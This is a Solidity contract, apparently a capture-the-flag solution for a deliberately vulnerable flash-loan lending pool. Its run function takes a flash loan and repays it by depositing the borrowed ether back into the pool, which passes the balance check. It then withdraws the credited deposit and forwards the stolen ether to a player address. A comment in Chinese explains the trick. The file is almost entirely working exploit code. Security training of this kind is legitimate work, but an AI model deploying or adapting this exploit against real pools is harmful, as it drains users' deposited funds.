// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceLenderPoolAttack {
    ISideEntranceLenderPool pool;
    uint loadAmount;
    function run(address _runAddress,uint _loadAmount) external{
        loadAmount = _loadAmount;
        pool = ISideEntranceLenderPool(_runAddress);
        pool.flashLoan(loadAmount);
        pool.withdraw();
    }
    
    function execute() external payable {
        //先存，原生余额会增加，则通过闪电贷的检测，闪电贷后再根据balances[user]取款.
        pool.deposit{value:loadAmount}();
    }

    function withdraw(address playerAddress) external {
        payable(playerAddress).transfer(loadAmount);
    }

    receive() external payable{}
}
 